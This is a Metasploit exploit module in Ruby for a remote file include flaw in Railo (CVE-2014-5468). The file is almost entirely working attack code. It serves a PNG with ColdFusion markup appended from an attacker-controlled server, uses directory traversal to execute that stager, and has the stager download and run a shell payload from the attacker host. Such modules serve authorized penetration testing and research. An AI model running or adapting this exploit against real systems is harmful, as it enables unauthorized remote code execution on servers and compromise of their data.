# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
                      &#039;Name&#039; => &#039;Railo Remote File Include&#039;,
                      &#039;Description&#039; => &#039;
                      This module exploits a remote file include vulnerability in Railo,
                      tested against version 4.2.1. First, a call using a vulnerable
                      <cffile> line in thumbnail.cfm allows an atacker to download an
                      arbitrary PNG file. By appending a .cfm, and taking advantage of
                      a directory traversal, an attacker can append cold fusion markup
                      used to stage and execute a fully-fledged payload.
                                            &#039;,
                      &#039;License&#039; => MSF_LICENSE,
                      &#039;Author&#039; => [
                        &#039;Bryan Alexander <drone@ballastsecurity.net>&#039;, # Discovery/PoC
                        &#039;bperry&#039; # metasploited
                      ],
                      &#039;References&#039; => [
                        [&#039;CVE&#039;, &#039;2014-5468&#039;],
                        [&#039;URL&#039;, &#039;http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/&#039;]
                      ],
                      &#039;Payload&#039; => {
                        &#039;Space&#039; => 99999, # if there is disk space, I think we will fit
                        &#039;BadChars&#039; => "",
                        &#039;DisableNops&#039; => true,
                        &#039;Compat&#039; => {
                          &#039;PayloadType&#039; => &#039;cmd&#039;,
                          &#039;RequiredCmd&#039; => &#039;generic netcat perl ruby python bash telnet&#039;
                        }
                      },
                      &#039;Platform&#039; => %w(                      unix                      ),
                      &#039;Targets&#039; =>
                      [
                        [
                          &#039;Automatic&#039;,
                          {
                            &#039;Platform&#039; => [ &#039;unix&#039; ],
                            &#039;Arch&#039; => ARCH_CMD
                          }
                        ]
                      ],
                      &#039;DefaultTarget&#039; => 0,
                      &#039;DisclosureDate&#039; => &#039;Aug 26 2014&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base URI of the Railo server&#039;, &#039;/railo-context/&#039;]),
        OptInt.new(&#039;STAGEWAIT&#039;, [true, &#039;Number of seconds to wait for stager to download&#039;, 10])
      ], self.class)
  end

  def check
    md5 = &#039;6de48cb72421cfabdce440077a921b25&#039; # /res/images/id.png

    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(&#039;res&#039;, &#039;images&#039;, &#039;id.png&#039;) # the targeturi is not used in this request
    )

    if !res
      fail_with(Failure::Unknown, &#039;Server did not respond&#039;)
    elsif !res.body
      fail_with(Failure::Unknown, "Server responded without a body: #{res.code} #{res.message}")
    end

    new_md5 = Rex::Text.md5(res.body)

    return Exploit::CheckCode::Appears if new_md5 == md5

    Exploit::CheckCode::Safe
  end

  def exploit
    if datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;
      fail_with(Failure::BadConfig, &#039;SRVHOST must be an IP address accessible from another computer&#039;)
    end

    url = &#039;http://&#039; + datastore[&#039;SRVHOST&#039;] + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s

    @shell_name = Rex::Text.rand_text_alpha(15)
    stager_name = Rex::Text.rand_text_alpha(15) + &#039;.cfm&#039;

    start_service(&#039;Uri&#039; => {
                    &#039;Proc&#039; => proc do |cli, req|
                      on_request_stager(cli, req)
                    end,
                    &#039;Path&#039; => &#039;/&#039; + stager_name
                  })

    start_service(&#039;Uri&#039; => {
                    &#039;Proc&#039; => proc do |cli, req|
                      on_request_shell(cli, req)
                    end,
                    &#039;Path&#039; => &#039;/&#039; + @shell_name
                  })

    wh = &#039;5000&#039; # width and height

    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;thumbnail.cfm&#039;),
      &#039;vars_get&#039; => {
        &#039;img&#039; => url + &#039;/&#039; + stager_name,
        &#039;height&#039; => wh,
        &#039;width&#039; => wh
      }
    )

    if !res
      fail_with(Failure::Unknown, &#039;Server did not respond&#039;)
    elsif res.code != 500
      fail_with(Failure::Unknown, "Server did not respond with the expected HTTP 500: #{res.code} #{res.message}")
    end

    print_status(&#039;Waiting for first stage to download...&#039;)

    i = datastore[&#039;STAGEWAIT&#039;]
    while !@staged && i > 0
      select(nil, nil, nil, 1)
      print_status("Waiting for #{i} more seconds...")
      i = i - 1
    end

    @staged = false

    if i == 0
      fail_with(Failure::Unknown, &#039;Server did not request the stager.&#039;)
    end

    hash = Rex::Text.md5("#{url + "/" + stager_name}-#{wh}-#{wh}") # 5000 is width and height from GET

    hash.upcase!

    print_status(&#039;Executing stager&#039;)

    send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;img.cfm&#039;),
      &#039;vars_get&#039; => {
        &#039;attributes.src&#039; => &#039;../../../../temp/admin-ext-thumbnails/&#039; + hash,
        &#039;thistag.executionmode&#039; => &#039;start&#039;
      }
    )
  end

  def on_request_shell(cli, _request)
    print_status(&#039;Sending payload&#039;)
    send_response(cli, payload.encoded, {})
    handler(cli)
  end

  def on_request_stager(cli, _request)
    url = &#039;http://&#039; + datastore[&#039;SRVHOST&#039;] + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + &#039;/&#039; + @shell_name

    stager = "<cfhttp method=&#039;get&#039; url=&#039;#{url}&#039;"
    stager << " path=&#039;#GetDirectoryFromPath(GetCurrentTemplatePath())#..\\..\\..\\..\\..\\..\\&#039;"
    stager << " file=&#039;#{@shell_name}&#039;>"
    stager << "<cfexecute name=&#039;sh&#039; arguments=&#039;#{@shell_name}&#039; timeout=&#039;99999&#039;></cfexecute>"

    png = &#039;iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcS&#039;
    png << &#039;JAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==&#039;

    # A very small PNG file
    png = Rex::Text.decode_base64(png)

    stager.each_byte do |b|
      png << b
    end

    png << 0x00

    print_status(&#039;Sending stage. This might be sent multiple times.&#039;)
    send_response(cli, png,  &#039;Content-Type&#039; => &#039;image/png&#039;)

    @staged = true

    handler(cli)
  end
end

